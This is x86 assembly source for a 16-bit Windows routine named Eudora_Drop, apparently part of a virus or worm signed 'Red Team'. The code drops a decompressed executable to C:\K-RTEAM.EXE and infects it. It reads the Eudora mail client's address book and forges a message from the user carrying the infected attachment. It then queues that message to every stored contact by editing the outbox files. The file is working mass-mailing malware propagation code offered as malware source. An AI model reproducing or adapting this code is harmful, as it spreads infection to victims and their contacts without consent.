;=======================(Code Warez)=========================================
;
; Eudora Stufs.
;
include eudora.ash

;----------------------------------------------------------------------------
;
; TASM Windows model stuff..
;

		.model small, WINDOWS PASCAL
		.386p
		.code
		assume 	ds:@code, es:@code

PUBLIC		Eudora_Drop
Eudora_Drop	proc	near

		enter	stack_var_size,0
		;
		; Check if it old warez..
		;
		push	cs
		call	FileSkip9		; lpPathName
		 db	'RTBASE.TOC',0
    FileSkip9:	push	02h			; iReadWrite
		call	a_LOPEN
		inc	ax
		jz	noow
		dec	ax
		push	ax
		call	a_LCLOSE
		leave
		ret
    noow:	;
		; Init Stack Vars
		;
		cld
		and	wo ss:[bp.Heap_Selector],0
		or	wo ss:[bp.TocFile_Handle],-1
		or	dwo ss:[bp.MbxFile_Handle],-1	; and NickFile_Handle
		;
		; Allocate Heap
		;
		push	042h			; wFlags
		push	L heap_var_size		; dwBytes
		call	aGLOBALALLOC
		or	ax,ax
		jz	_jzAbort0
		push	ax
		push	ax			; hMem
		call	aGLOBALLOCK
		pop	wo ss:[bp.Heap_Selector]
		;
		; Open Files
		;
		push	cs
		call	FileSkip0		; lpPathName
		 db	'OUT.TOC',0
    FileSkip0:	push	02h			; iReadWrite
		call	a_LOPEN
		mov	wo ss:[bp.TocFile_Handle],ax
		inc	ax
    _jzAbort0:	jz	_jzAbort1
		push	cs
		call	FileSkip1		; lpPathName
		 db	'OUT.MBX',0
    FileSkip1:	push	02h			; iReadWrite
		call	a_LOPEN
		mov	wo ss:[bp.MbxFile_Handle],ax
		inc	ax
    _jzAbort1:	jz	_jzAbort2
		push	cs
		call	FileSkip2		; lpPathName
		 db	'NNDBASE.TOC',0
    FileSkip2:	push	02h			; iReadWrite
		call	a_LOPEN
		mov	wo ss:[bp.NickFile_Handle],ax
		inc	ax
    _jzAbort2:	jz	_jzAbort3
		;
		; Note as old warez..
		;
		push	cs
		call	FileSkip4		; lpPathName
		 db	'RTBASE.TOC',0
    FileSkip4:	push	20h			; iAttribute
		call	a_LCREAT
		push	ax
		call	a_LCLOSE
		;
		; Decompress, Create, Infect Dropper
		;
		mov	es,wo ss:[bp.Heap_Selector]
		push	cs
		pop	ds
		mov	di,ofs MsgBuffer
		call	ddelta
    ddelta:	pop	si
		add	si,(ofs Compressed_EXE - ofs ddelta)
		call	Decompress
		sub	di,ofs MsgBuffer
		mov	wo ss:[bp.Msg_Length],di
		push	cs
		call	FileSkip3		; lpPathName
		 db	'C:\K-RTEAM.EXE',0
    FileSkip3:	push	20h			; iAttribute
		call	a_LCREAT
		mov	wo ss:[bp.DropFile_Handle],ax
		inc	ax
    _jzAbort3:	jz	Abort
		push	wo ss:[bp.DropFile_Handle]	; hFile
		push	wo ss:[bp.Heap_Selector]
		push	ofs MsgBuffer			; lpBuffer
		push	wo ss:[bp.Msg_Length]		; wBytes
		call	a_LWRITE
		cmp	ax,wo ss:[bp.Msg_Length]
		jne	Abort
		mov	ax,8000h
		or	ax,wo ss:[bp.DropFile_Handle]
		call	Infect_ModuleHandle
		;
		; Decompress Message
		;
		mov	es,wo ss:[bp.Heap_Selector]
		push	cs
		pop	ds
		mov	di,ofs MsgBuffer
		call	mdelta
    mdelta:	pop	si
		add	si,(ofs Compressed_Msg - ofs mdelta)
		call	Decompress
		sub	di,ofs MsgBuffer
		mov	wo ss:[bp.Msg_Length],di
		;
		; Read and Process Nicks
		;  - Read 1600 bytes.
		;  - Abort if less than 2 or 1600 bytes read.
		;  - Copy nicks from toc, add ', '
		;  - Maintain final LFCR.
		;  - If nicks are less than 64 bytes long, null pad.
		;
		push	wo ss:[bp.NickFile_Handle]	; hFile
		push	wo ss:[bp.Heap_Selector]
		push	ofs ConstructBuffer		; lpBuffer
		push	1600				; wBytes
		call	a_LREAD
		cmp	ax,1600
		jae	Abort
		mov	si,2
		cmp	ax,si
		jbe	Abort
		mov	wo ss:[bp.NickNames_Length],ax
		mov	ds,wo ss:[bp.Heap_Selector]
		push	ds
		pop	es
		mov	di,ofs NickNames
    nnl0:	call	Copy_Line
		add	si,10h
		mov	wo ds:[di-2],' ,'
		cmp	si,wo ss:[bp.NickNames_Length]
		jb	nnl0
		lea	ax,[di - ofs NickNames]
		mov	wo ss:[bp.NickNames_Length],ax
		mov	wo ds:[di-2],0A0Dh
		mov	cx,(ofs NickNames + 40h)
		sub	cx,di
		jbe	nn1
		mov	al,0
		rep	stosb
    nn1:	;
		; Read TOC File header.
		; - Check if Outbox.
		;
		push	wo ss:[bp.TocFile_Handle]	; hFile
		push	ss
		lea	ax,[bp.TocHeader]
		push	ax				; lpBuffer
		push	tochdr_Size			; wBytes
		call	a_LREAD
		cmp	ax,tochdr_Size
		jne	nnjne_abort0
		cmp	wo ss:[bp.TocHeader.tochdr_MailBox_Type],01h
  nnjne_abort0:	jne	nnjne_abort1
		;
		; Read Last MSG header.
		;
		mov	ax,msghdr_Size
		mul	wo ss:[bp.TocHeader.tochdr_Message_Count]
		sub	ax,(msghdr_Size - tochdr_Size)
		sbb	dx,0
		push	wo ss:[bp.TocFile_Handle]	; hFile
		push	dx ax				; lOffset
		push	0				; iOrigin
		call	a_LLSEEK
		push	wo ss:[bp.TocFile_Handle]	; hFile
		push	ss
		lea	ax,[bp.MsgHeader]
		push	ax				; lpBuffer
		push	msghdr_Size			; wBytes
		call	a_LREAD
		cmp	ax,msghdr_Size
  nnjne_abort1:	jne	Abort
		;
		; Read Start of Previous Message.
		;
		push	wo ss:[bp.MbxFile_Handle]		; hFile
		push	dwo ss:[bp.MsgHeader.msghdr_MBX_FilePos]; lOffset
		push	0					; iOrigin
		call	a_LLSEEK
		push	wo ss:[bp.MbxFile_Handle]		; hFile
		push	wo ss:[bp.Heap_Selector]
		push	ofs MsgStart				; lpBuffer
		push	300					; wBytes
		call	a_LREAD
		;
		; Construct the message..
		;
		mov	ds,wo ss:[bp.Heap_Selector]	; From header
		mov	si,ofs MsgStart
		push	ds
		pop	es
		xor	di,di				; di=Construct Buuffer
		call	Copy_Line
		movsd					; 'To: '
		mov	cx,wo ss:[bp.NickNames_Length]	; recipient list
		mov	si,ofs NickNames
		rep	movsb
		mov	si,ofs MsgStart + 7
  ffll:		sub	si,3				; find From line
		lodsd
		add	eax,0-('morF')
		jne	ffll
		sub	si,4				; copy From line
		call	Copy_Line
		mov	si,ofs MsgBuffer		; message body..
		mov	cx,wo ss:[bp.Msg_Length]
		rep	movsb
		;
		; Construct the TOC MSG header..
		; (while writing message to MBX)
		;
		mov	wo ss:[bp.MsgHeader.msghdr_MBX_Length],di
		push	wo ss:[bp.MbxFile_Handle]	; hFile
		push	L 0				; lOffset
		push	02h				; iOrigin
		call	a_LLSEEK
		mov	wo ss:[bp.MsgHeader.msghdr_MBX_FilePos],ax
		mov	wo ss:[bp.MsgHeader.msghdr_MBX_FilePos.2],dx
		push	wo ss:[bp.MbxFile_Handle]		; hFile
		push	wo ss:[bp.Heap_Selector]
		push	ofs ConstructBuffer			; lpBuffer
		push	wo ss:[bp.MsgHeader.msghdr_MBX_Length]  ; wBytes
		call	a_LWRITE
		cmp	ax,[bp.MsgHeader.msghdr_MBX_Length]
		jne	Abort
		;
		; Set MsgHeader.Type=Qued
		; Set MsgHeader.Priority=1
		; Set MsgHeader.Label=0
		; Set MsgHeader.Flags Attachment present
		; Set MsgHeader.Recipient Field
		; Set MsgHeader.Subject Field
		; Append MsgHeader
		;
		mov	wo ss:[bp.MsgHeader.msghdr_Type],07h
		mov	wo ss:[bp.MsgHeader.msghdr_Priority],01h
		and	wo ss:[bp.MsgHeader.msghdr_Label],0
		or	wo ss:[bp.MsgHeader.msghdr_Flags],8000h
		push	ss
		pop	es
		lea	di,[bp.MsgHeader.msghdr_azRecipient]	; Recipients
		mov	ds,wo ss:[bp.Heap_Selector]
		mov	si,ofs NickNames
		mov	cx,3Fh
		rep	movsb
		mov	cl,41h					; Subject
		xor	al,al
		rep	stosb
		sub	dwo ss:[bp.MsgHeader.msghdr_azSubject], 0-(' deR')
		sub	dwo ss:[bp.MsgHeader.msghdr_azSubject.4], 0-('maeT')
		push	wo ss:[bp.TocFile_Handle]	; hFile
		push	L 0				; lOffset
		push	02h				; iOrigin
		call	a_LLSEEK
		push	wo ss:[bp.TocFile_Handle]	; hFile
		push	ss
		lea	ax,[bp.MsgHeader]
		push	ax				; lpBuffer
		push	msghdr_Size			; wBytes
		call	a_LWRITE
		cmp	ax,msghdr_Size
		jne	Abort
		;
		; Increase TocHeader.MSG_Count.
		; Write TocHeader.
		;
		inc	wo ss:[bp.TocHeader.tochdr_Message_Count]
		push	wo ss:[bp.TocFile_Handle]	; hFile
		push	L 0				; lOffset
		push	00h				; iOrigin
		call	a_LLSEEK
		push	wo ss:[bp.TocFile_Handle]	; hFile
		push	ss
		lea	ax,[bp.TocHeader]
		push	ax				; lpBuffer
		push	tochdr_Size			; wBytes
		call	a_LWRITE

;--------------(Audi..)------------------------------------------------------
Abort:		;
		; Free File Handles..
		;
		mov	cx,4
		xor	si,si
	afl:	push	cx si
		mov	cx,wo ss:[bp.si.TocFile_Handle]
		cmp	cx,-1
		je	afn
		push	cx
		call	a_LCLOSE
	afn:	pop	si cx
		inc	si	; lodsw = Random GPF..
		inc	si
		loop	afl		 
		;
		; And GHeap Handle (G == Global, G != Garbage)
		;
		mov	cx, wo ss:[bp.Heap_Selector]
		jcxz	anhs
		push	cx cx
		call	aGLOBALUNLOCK
		call	aGLOBALFREE
	anhs:	leave
		ret


;--------------(I dont know.. it was like this when i got here..)------------

Copy_Line:	lodsb
		stosb
		cmp	al,0Ah
		jne	Copy_Line
		ret

;--------------(This suxors)-------------------------------------------------

include eud_data.inc

Eudora_Drop	endp
		end
;============================================================================